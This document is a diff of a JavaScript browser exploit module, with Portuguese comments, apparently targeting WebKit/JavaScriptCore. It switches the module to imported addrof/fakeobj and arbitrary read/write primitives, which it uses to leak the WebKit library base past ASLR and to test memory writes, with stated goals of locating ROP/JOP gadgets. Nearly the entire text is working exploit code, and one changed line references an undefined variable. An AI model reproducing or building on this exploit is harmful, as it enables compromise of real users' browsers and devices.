@@ -1,8 +1,8 @@
 // js/script3/testArrayBufferVictimCrash.mjs (v118 - R60 Final com Verificação e Robustez Máxima)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA PARA ROBUSTEZ MÁXIMA E VAZAMENTO REAL E LIMPO DE ASLR:
-// - AGORA UTILIZA PRIMITIVAS ADDROF/FAKEOBJ DIRETAS DO core_exploit.mjs para maior estabilidade.
-// - Redução da verbosidade dos logs de debug para facilitar a leitura.
+// - AGORA UTILIZA PRIMITIVAS ADDROF/FAKEOBJ DIRETAS E ARB_READ/ARB_WRITE DIRETAS DO core_exploit.mjs para maior estabilidade e clareza.
+// - Redução drástica da verbosidade dos logs de debug para facilitar a leitura.
 // - Spray volumoso e persistente.
 // - Verificação e validação contínuas em cada etapa crítica.
 // - Cálculo funcional de endereços de gadgets para ROP/JOP.
@@ -16,9 +16,11 @@ import {
     triggerOOB_primitive,
     getOOBDataView,
     clearOOBEnvironment,
-    addrof_core, // NEW: Import directly from core_exploit
-    fakeobj_core, // NEW: Import directly from core_exploit
-    initCoreAddrofFakeobjPrimitives // NEW: Import init function
+    addrof_core,             // NEW: Import directly from core_exploit
+    fakeobj_core,            // NEW: Import directly from core_exploit
+    initCoreAddrofFakeobjPrimitives, // NEW: Import init function
+    arb_read,                // NEW: Import direct arb_read from core_exploit
+    arb_write                // NEW: Import direct arb_write from core_exploit
 } from '../core_exploit.mjs';
 
 import { WEBKIT_LIBRARY_INFO } from '../config.mjs';
@@ -44,9 +46,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
     let final_result = { success: false, message: "A verificação funcional de L/E falhou.", details: {} };
     const startTime = performance.now();
 
-    let arb_read_primitive = null;
-    let arb_write_primitive = null;
-
     try {
         logFn("Limpeza inicial do ambiente OOB para garantir estado limpo...", "info");
         clearOOBEnvironment({ force_clear_even_if_not_setup: true });
@@ -64,7 +63,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         logFn("Heap estabilizado inicialmente para reduzir realocações inesperadas pelo GC.", "good");
         await pauseFn(LOCAL_SHORT_PAUSE);
 
-        // --- FASE 2: Obtendo OOB e Primitivas addrof/fakeobj ---
+        // --- FASE 2: Obtendo OOB e Primitivas addrof/fakeobj com validações ---
         logFn("--- FASE 2: Obtendo primitivas OOB e addrof/fakeobj com validações ---", "subtest");
         const oobSetupStartTime = performance.now();
         logFn("Chamando triggerOOB_primitive para configurar o ambiente OOB (garantindo re-inicialização)...", "info");
@@ -79,63 +78,16 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         await pauseFn(LOCAL_SHORT_PAUSE);
 
         // NEW: Initialize core addrof/fakeobj primitives
-        initCoreAddrofFakeobjPrimitives(logFn);
+        initCoreAddrofFakeobjPrimitives(); // No logFn here, as initCore will use its own log function (set via setLogFunction in utils)
         logFn("Primitivas PRINCIPAIS 'addrof' e 'fakeobj' (agora no core_exploit.mjs) operacionais e robustas.", "good");
 
 
-        // --- FASE 3: Construção da Primitiva de L/E Autocontida ---
-        logFn("--- FASE 3: Construindo ferramenta de L/E autocontida ---", "subtest");
+        // --- FASE 3: Construindo ferramenta de L/E autocontida (AGORA USANDO ARB_READ/WRITE DIRETOS DO CORE_EXPLOIT) ---
+        logFn("--- FASE 3: Construindo ferramenta de L/E autocontida (utilizando arb_read/arb_write do core_exploit) ---", "subtest");
         const leakerSetupStartTime = performance.now();
-        const leaker = { obj_prop: null, val_prop: 0 };
-        logFn(`Objeto 'leaker' inicializado: ${JSON.stringify(leaker)}`, "debug");
-
-        const leaker_addr = addrof_core(leaker); // Use core primitive
-        logFn(`Endereço de 'leaker' obtido: ${leaker_addr.toString(true)}`, "info");
-
-        const original_oob_array_buffer = getOOBDataView().buffer;
-        logFn(`Referência ao ArrayBuffer original do OOB DataView (${original_oob_array_buffer.byteLength} bytes) mantida para evitar GC inesperado.`, "info");
-
-        const val_prop_offset = JSC_OFFSETS_PARAM.JSObject.BUTTERFLY_OFFSET; // Assuming 0x10 from config for {obj_prop:null, val_prop:0}
-        const val_prop_addr = leaker_addr.add(val_prop_offset);
-        logFn(`Endereço da propriedade 'val_prop' calculada: ${val_prop_addr.toString(true)} (offset 0x${val_prop_offset.toString(16)} do leaker_addr)`, "info");
-
-
-        arb_read_primitive = (addr) => {
-            logFn(`[ARB_READ] Tentando ler de endereço ${addr.toString(true)}`, "debug");
-            if (!isAdvancedInt64Object(addr) || addr.equals(AdvancedInt64.Zero)) {
-                const failMsg = `[ARB_READ] ERRO: Endereço inválido para leitura arbitrária: ${addr.toString(true)}.`;
-                logFn(failMsg, "error");
-                throw new Error(failMsg);
-            }
-            leaker.obj_prop = fakeobj_core(addr); // Use core primitive
-            const value = doubleToInt64(leaker.val_prop, logFn); // Use local conversion, not from core_exploit (to avoid circular dep)
-            logFn(`[ARB_READ] SUCESSO: Valor lido de ${addr.toString(true)}: ${value.toString(true)}`, "debug");
-            return value;
-        };
-
-        arb_write_primitive = (addr, value) => {
-            logFn(`[ARB_WRITE] Tentando escrever valor ${value.toString(true)} no endereço ${addr.toString(true)}`, "debug");
-            if (!isAdvancedInt64Object(addr) || addr.equals(AdvancedInt64.Zero)) {
-                const failMsg = `[ARB_WRITE] ERRO: Endereço inválido para escrita arbitrária: ${addr.toString(true)}.`;
-                logFn(failMsg, "error");
-                throw new Error(failMsg);
-            }
-            let valueToWrite = value;
-            if (!isAdvancedInt64Object(valueToWrite)) {
-                logFn(`[ARB_WRITE] ALERTA: Valor para escrita não é AdvancedInt64, tentando converter: ${value}`, "warn");
-                try {
-                    valueToWrite = new AdvancedInt64(value);
-                } catch (convErr) {
-                    const failMsg = `[ARB_WRITE] ERRO: Falha na conversão do valor para AdvancedInt64: ${convErr.message}.`;
-                    logFn(failMsg, "critical");
-                    throw new Error(failMsg);
-                }
-            }
-            leaker.obj_prop = fakeobj_core(addr); // Use core primitive
-            leaker.val_prop = int64ToDouble(valueToWrite, logFn); // Use local conversion
-            logFn(`[ARB_WRITE] SUCESSO: Escrita concluída no endereço ${addr.toString(true)}.`, "debug");
-        };
-        logFn(`Primitivas de Leitura/Escrita Arbitrária autocontidas (principais) estão prontas. Tempo: ${(performance.now() - leakerSetupStartTime).toFixed(2)}ms`, "good");
+        // Não é mais necessário um objeto 'leaker' intermediário para ARB_READ/WRITE
+        // As primitivas arb_read e arb_write do core_exploit operam diretamente em endereços.
+        logFn(`Primitivas de Leitura/Escrita Arbitrária autocontidas (principais) estão prontas via core_exploit. Tempo: ${(performance.now() - leakerSetupStartTime).toFixed(2)}ms`, "good");
         await pauseFn(LOCAL_SHORT_PAUSE);
 
         // --- FASE 4: Vazamento REAL e LIMPO da Base da Biblioteca WebKit e Descoberta de Gadgets (Funcional - VIA Uint8Array) ---
@@ -165,12 +117,10 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         await pauseFn(LOCAL_SHORT_PAUSE);
 
         // 3. Ler o ponteiro para a Structure* do Uint8Array (ArrayBufferView)
-        // Reduzindo o volume de DEBUG_MEM para apenas o essencial (cerca de 5-10 linhas)
         logFn(`[REAL LEAK] Tentando ler ponteiro da Structure* no offset 0x${JSC_OFFSETS_PARAM.ArrayBufferView.STRUCTURE_ID_OFFSET.toString(16)} do Uint8Array base...`, "info");
 
-        // Only log the direct read around the critical offset, not a full sweep
         const structure_read_address = typed_array_addr.add(JSC_OFFSETS_PARAM.ArrayBufferView.STRUCTURE_ID_OFFSET);
-        const typed_array_structure_ptr = arb_read_primitive(structure_read_address);
+        const typed_array_structure_ptr = await arb_read(structure_read_address, 8); // Use direct arb_read
         logFn(`[REAL LEAK] DEBUG_READ_STRUCTURE: Lido de ${structure_read_address.toString(true)}: ${typed_array_structure_ptr.toString(true)}`, "debug");
 
         if (!isAdvancedInt64Object(typed_array_structure_ptr) || typed_array_structure_ptr.equals(AdvancedInt64.Zero) || typed_array_structure_ptr.equals(AdvancedInt64.NaNValue)) {
@@ -182,7 +132,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         await pauseFn(LOCAL_SHORT_PAUSE);
 
         // 4. Ler o ponteiro para a ClassInfo* da Structure do Uint8Array
-        const class_info_ptr = arb_read_primitive(typed_array_structure_ptr.add(JSC_OFFSETS_PARAM.Structure.CLASS_INFO_OFFSET));
+        const class_info_ptr = await arb_read(typed_array_structure_ptr.add(JSC_OFFSETS_PARAM.Structure.CLASS_INFO_OFFSET), 8); // Use direct arb_read
         if (!isAdvancedInt64Object(class_info_ptr) || class_info_ptr.equals(AdvancedInt64.Zero) || class_info_ptr.equals(AdvancedInt64.NaNValue)) {
             const errorMsg = `[REAL LEAK] Falha ao ler ponteiro da ClassInfo do Uint8Array's Structure. Endereço inválido: ${class_info_ptr ? class_info_ptr.toString(true) : 'N/A'}. low: 0x${class_info_ptr?.low().toString(16) || 'N/A'}, high: 0x${class_info_ptr?.high().toString(16) || 'N/A'}. Isso pode indicar corrupção ou offset incorreto.`;
             logFn(errorMsg, "critical");
@@ -229,12 +179,12 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         const value_to_write_post_leak = new AdvancedInt64(0xDEADC0DE, 0xFEEDBEEF);
         const prop_a_addr_post_leak = test_obj_addr_post_leak.add(JSC_OFFSETS_PARAM.JSObject.BUTTERFLY_OFFSET);
 
-        logFn(`Executando arb_write_primitive (Pós-Vazamento): escrevendo ${value_to_write_post_leak.toString(true)} no endereço ${prop_a_addr_post_leak.toString(true)}...`, "info");
-        arb_write_primitive(prop_a_addr_post_leak, value_to_write_post_leak);
+        logFn(`Executando arb_write (Pós-Vazamento): escrevendo ${value_to_write_post_leak.toString(true)} no endereço ${prop_a_addr_post_leak.toString(true)}...`, "info");
+        await arb_write(prop_a_addr_post_leak, value_to_write_post_leak, 8); // Use direct arb_write
         logFn(`Escrita do valor de teste (Pós-Vazamento) concluída.`, "info");
 
-        logFn(`Executando arb_read_primitive (Pós-Vazamento): lendo do endereço ${prop_a_addr_post_leak.toString(true)}...`, "info");
-        const value_read_post_leak = arb_read_primitive(prop_a_addr_post_leak);
+        logFn(`Executando arb_read (Pós-Vazamento): lendo do endereço ${prop_a_addr_post_leak.toString(true)}...`, "info");
+        const value_read_post_leak = await arb_read(prop_a_addr_post_leak, 8); // Use direct arb_read
         logFn(`Leitura do valor de teste (Pós-Vazamento) concluída.`, "info");
         logFn(`>>>>> VALOR LIDO DE VOLTA (Pós-Vazamento): ${value_read_post_leak.toString(true)} <<<<<`, "leak");
 
@@ -249,8 +199,8 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         for (let i = 0; i < numResistanceTests; i++) {
             const test_value = new AdvancedInt64(0xCCCC0000 + i, 0xDDDD0000 + i);
             try {
-                arb_write_primitive(prop_a_addr_post_leak, test_value);
-                const read_back_value = arb_read_primitive(prop_a_addr_post_leak);
+                await arb_write(prop_a_addr_post_leak, test_value, 8); // Use direct arb_write
+                const read_back_value = await arb_read(prop_a_addr_post_leak, 8); // Use direct arb_read
 
                 if (read_back_value.equals(test_value)) {
                     resistanceSuccessCount_post_leak++;
@@ -267,7 +217,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
             logFn(`SUCESSO TOTAL: Teste de resistência PÓS-VAZAMENTO concluído. ${resistanceSuccessCount_post_leak}/${numResistanceTests} operações bem-sucedidas.`, "good");
         } else {
             logFn(`ALERTA: Teste de resistência PÓS-VAZAMENTO concluído com ${numResistanceTests - resistanceSuccessCount_post_leak} falhas.`, "warn");
-            final_result.message += ` (Teste de resistência L/E pós-vazamento com falhas: ${numResistanceTests - resistanceSuccessCount_post_leak})`;
+            final_result.message += ` (Teste de resistência L/E pós-vazamento com falhas: ${numResistanceTests - resistanceSuccessTests_post_leak})`;
         }
         logFn(`Verificação funcional de L/E e Teste de Resistência PÓS-VAZAMENTO concluídos. Tempo: ${(performance.now() - rwTestPostLeakStartTime).toFixed(2)}ms`, "info");
 
@@ -288,9 +238,9 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         logFn(final_result.message, "critical");
     } finally {
         logFn(`Iniciando limpeza final do ambiente e do spray de objetos...`, "info");
-        local_distraction_spray = []; // Clear
-        pre_typed_array_spray = []; // Clear
-        post_typed_array_spray = []; // Clear
+        // Clear sprays to assist GC
+        pre_typed_array_spray = [];
+        post_typed_array_spray = [];
 
         clearOOBEnvironment({ force_clear_even_if_not_setup: true });
         global_spray_objects = [];
